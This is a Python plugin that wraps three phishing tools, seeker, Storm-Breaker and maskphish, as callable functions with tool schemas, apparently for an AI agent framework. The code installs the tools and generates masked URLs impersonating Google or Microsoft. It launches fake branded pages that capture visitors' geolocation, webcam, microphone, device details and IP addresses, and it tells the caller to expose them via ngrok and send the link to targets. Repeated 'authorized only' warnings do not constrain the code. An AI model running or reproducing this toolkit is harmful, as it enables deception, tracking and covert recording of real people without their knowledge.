"""
ARGOS Plugin: Social Engineering Testing Tools
Authorized red team tools for testing employee security awareness and phishing defenses.

Tools:
  - seeker:      geolocation capture via social engineering (fake pages)
  - Storm-Breaker: webcam/microphone/geolocation social engineering
  - maskphish:   URL masking/phishing URL obfuscation for awareness tests

⚠️  AUTHORIZED RED TEAM / SECURITY AWARENESS TESTING ONLY.
    Use ONLY in authorized penetration testing engagements.
    Targets must have provided explicit written consent.
    Unauthorized use is illegal under computer crime laws worldwide.

Auto-installs to /opt/argos/tools/
  seeker:       https://github.com/thewhiteh4t/seeker
  Storm-Breaker: https://github.com/xaw3ep/Storm-Breaker
  maskphish:    https://github.com/jaykali/maskphish
"""
from __future__ import annotations
import os, subprocess, re, shutil
from pathlib import Path

MANIFEST = {
    "id":          "social_engineering",
    "name":        "Social Engineering Testing (seeker + Storm-Breaker + maskphish)",
    "description": "Authorized social engineering: geolocation capture, URL masking, phishing simulation. RED TEAM ONLY.",
    "version":     "1.0.0",
    "author":      "ARGOS",
    "requires":    [],
}

_TOOLS_BASE     = Path("/opt/argos/tools")
_SEEKER_DIR     = _TOOLS_BASE / "seeker"
_STORMBREAKER_DIR = _TOOLS_BASE / "Storm-Breaker"
_MASKPHISH_DIR  = _TOOLS_BASE / "maskphish"


def _clone_tool(repo: str, dest: Path) -> bool:
    if dest.exists():
        return True
    dest.parent.mkdir(parents=True, exist_ok=True)
    r = subprocess.run(
        ["git", "clone", "--depth=1", "-q",
         f"https://github.com/{repo}.git", str(dest)],
        capture_output=True, timeout=120
    )
    if r.returncode == 0 and (dest / "requirements.txt").exists():
        subprocess.run(
            ["pip3", "install", "-q", "--break-system-packages",
             "-r", str(dest / "requirements.txt")],
            capture_output=True, timeout=120
        )
    return r.returncode == 0


def maskphish_create(real_url: str, fake_domain: str = "",
                      description: str = "") -> dict:
    """Mask/obfuscate a URL for authorized phishing simulation testing.
    Creates a camouflaged URL that appears to point to a legitimate site.
    ⚠️  AUTHORIZED SOCIAL ENGINEERING TESTING ONLY.
    ⚠️  Use ONLY in authorized red team engagements with signed scope documents.

    real_url:    the actual URL to mask (e.g. your phishing test page)
    fake_domain: the domain name to mimic (e.g. google.com — makes URL look like google.com)
    description: campaign description for documentation
    """
    if not _clone_tool("jaykali/maskphish", _MASKPHISH_DIR):
        # Fallback: manual URL masking technique
        fake = fake_domain or "login.microsoft.com"
        masked_url = f"https://{fake}@{real_url.replace('https://', '').replace('http://', '')}"
        return {
            "real_url":    real_url,
            "masked_url":  masked_url,
            "fake_domain": fake,
            "method":      "manual (@-trick: browser shows domain before @)",
            "note":        "AUTHORIZED SOCIAL ENGINEERING TESTING ONLY",
            "warning":     "This technique is blocked by modern browsers. Use for awareness training demos only.",
        }

    script = next(
        (p for p in [_MASKPHISH_DIR / "maskphish.sh",
                     _MASKPHISH_DIR / "maskphish.py"]
         if p.exists()),
        None
    )

    if not script:
        return {"error": "maskphish script not found", "real_url": real_url}

    try:
        if script.suffix == ".sh":
            r = subprocess.run(
                ["bash", str(script)],
                input=f"{real_url}\n{fake_domain or 'google.com'}\n",
                capture_output=True, text=True, timeout=30,
                cwd=str(_MASKPHISH_DIR)
            )
        else:
            r = subprocess.run(
                ["python3", str(script), real_url, fake_domain or "google.com"],
                capture_output=True, text=True, timeout=30,
                cwd=str(_MASKPHISH_DIR)
            )
        output = r.stdout + r.stderr
        # Extract masked URL from output
        urls = re.findall(r'https?://[^\s\'"<>\]]+', output)
        return {
            "real_url":    real_url,
            "masked_url":  urls[-1] if urls else output.strip()[-200:],
            "output":      output[-500:],
            "campaign":    description,
            "note":        "AUTHORIZED SOCIAL ENGINEERING TESTING ONLY",
        }
    except Exception as e:
        return {"error": str(e)}


def seeker_start(template: str = "google",
                  port: int = 8080,
                  background: bool = True) -> dict:
    """Start a seeker server for authorized geolocation social engineering tests.
    Creates a fake page that requests location access when visited.
    ⚠️  AUTHORIZED RED TEAM / SECURITY AWARENESS TESTING ONLY.
    ⚠️  Requires ngrok or port forwarding to expose to internet.
    ⚠️  SIGNED WRITTEN CONSENT REQUIRED from target organization.

    Available templates: google, whatsapp, youtube, facebook, telegram, twitter, tinder, zoom

    template:   page template to display (default: google)
    port:       local HTTP server port (default: 8080)
    background: start in background process (default: true)
    """
    if not _clone_tool("thewhiteh4t/seeker", _SEEKER_DIR):
        return {"error": "Failed to install seeker"}

    script = next(
        (p for p in [_SEEKER_DIR / "seeker.py", _SEEKER_DIR / "seeker.sh"]
         if p.exists()),
        None
    )

    if not script:
        return {"error": "seeker script not found"}

    cmd = ["python3", str(script), "-t", template, "-p", str(port)]

    if background:
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                cwd=str(_SEEKER_DIR)
            )
            return {
                "status":    "started",
                "pid":       proc.pid,
                "template":  template,
                "local_url": f"http://localhost:{port}",
                "note":      "AUTHORIZED SOCIAL ENGINEERING TESTING ONLY",
                "next_step": "Use ngrok (ngrok http 8080) to expose publicly, then send URL to target in authorized test",
                "warning":   "SIGNED WRITTEN CONSENT REQUIRED — unauthorized use is illegal",
            }
        except Exception as e:
            return {"error": str(e)}
    else:
        return {
            "cmd":    " ".join(cmd),
            "status": "run_manually",
            "note":   "Run the command above in a terminal. Use ngrok to expose.",
        }


def seeker_list_templates() -> dict:
    """List available seeker page templates for social engineering tests.
    ⚠️  AUTHORIZED RED TEAM ONLY.
    """
    if not _clone_tool("thewhiteh4t/seeker", _SEEKER_DIR):
        return {"error": "Failed to install seeker"}

    templates_dir = _SEEKER_DIR / "templates"
    templates = []

    if templates_dir.exists():
        templates = [d.name for d in templates_dir.iterdir() if d.is_dir()]

    return {
        "source":    "seeker",
        "templates": templates or [
            "google", "whatsapp", "youtube", "facebook",
            "telegram", "twitter", "tinder", "zoom", "custom"
        ],
        "note":      "AUTHORIZED SOCIAL ENGINEERING TESTING ONLY",
        "usage":     "Use with seeker_start(template='google') in authorized engagements",
    }


def stormbreaker_start(port: int = 2525,
                        background: bool = True) -> dict:
    """Start Storm-Breaker social engineering server.
    Tests if targets will grant webcam/microphone/location access to attackers.
    ⚠️  AUTHORIZED RED TEAM / SECURITY AWARENESS TESTING ONLY.
    ⚠️  SIGNED WRITTEN CONSENT REQUIRED from target organization.

    port:       local server port (default: 2525)
    background: start in background (default: true)
    """
    if not _clone_tool("xaw3ep/Storm-Breaker", _STORMBREAKER_DIR):
        # Try the wlmzz fork
        if not _clone_tool("wlmzz/Storm-Breaker", _STORMBREAKER_DIR):
            return {"error": "Failed to install Storm-Breaker"}

    script = next(
        (p for p in [_STORMBREAKER_DIR / "st.py", _STORMBREAKER_DIR / "main.py",
                     _STORMBREAKER_DIR / "storm-breaker.py"]
         if p.exists()),
        None
    )

    if not script:
        return {"error": "Storm-Breaker script not found"}

    cmd = ["python3", str(script)]
    if background:
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                cwd=str(_STORMBREAKER_DIR)
            )
            return {
                "status":    "started",
                "pid":       proc.pid,
                "local_url": f"http://localhost:{port}",
                "note":      "AUTHORIZED SOCIAL ENGINEERING TESTING ONLY",
                "warning":   "SIGNED WRITTEN CONSENT REQUIRED — unauthorized use is illegal",
                "capabilities": [
                    "Geolocation access request",
                    "Webcam access request",
                    "Microphone access request",
                    "Device info collection",
                    "IP logging",
                ],
            }
        except Exception as e:
            return {"error": str(e)}
    else:
        return {"cmd": " ".join(cmd), "note": "AUTHORIZED SOCIAL ENGINEERING TESTING ONLY"}


TOOLS = {
    "maskphish_create": {
        "fn": maskphish_create,
        "description": (
            "Mask/obfuscate a URL to mimic a legitimate domain for authorized phishing simulation. "
            "⚠️ AUTHORIZED SOCIAL ENGINEERING TESTING ONLY — requires written consent."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "real_url":    {"type": "string", "description": "Actual URL to mask"},
                "fake_domain": {"type": "string", "description": "Domain to impersonate (e.g. google.com)"},
                "description": {"type": "string", "description": "Campaign description for documentation"},
            },
            "required": ["real_url"]
        }
    },
    "seeker_list_templates": {
        "fn": seeker_list_templates,
        "description": "List seeker social engineering page templates (google, whatsapp, zoom, etc.). ⚠️ AUTHORIZED RED TEAM ONLY.",
        "parameters": {"type": "object", "properties": {}, "required": []}
    },
    "seeker_start": {
        "fn": seeker_start,
        "description": (
            "Start seeker social engineering server to capture target geolocation. "
            "Creates a fake page requesting location access. Use ngrok to expose externally. "
            "⚠️ AUTHORIZED RED TEAM ONLY — SIGNED WRITTEN CONSENT REQUIRED."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "template":   {"type": "string",  "description": "Page template (google, whatsapp, youtube, zoom, etc.)"},
                "port":       {"type": "integer", "description": "Local HTTP server port (default: 8080)"},
                "background": {"type": "boolean", "description": "Start in background (default: true)"},
            },
            "required": []
        }
    },
    "stormbreaker_start": {
        "fn": stormbreaker_start,
        "description": (
            "Start Storm-Breaker social engineering server. "
            "Tests if targets grant webcam/microphone/geolocation access. "
            "⚠️ AUTHORIZED RED TEAM ONLY — SIGNED WRITTEN CONSENT REQUIRED."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "port":       {"type": "integer", "description": "Server port (default: 2525)"},
                "background": {"type": "boolean", "description": "Start in background (default: true)"},
            },
            "required": []
        }
    },
}
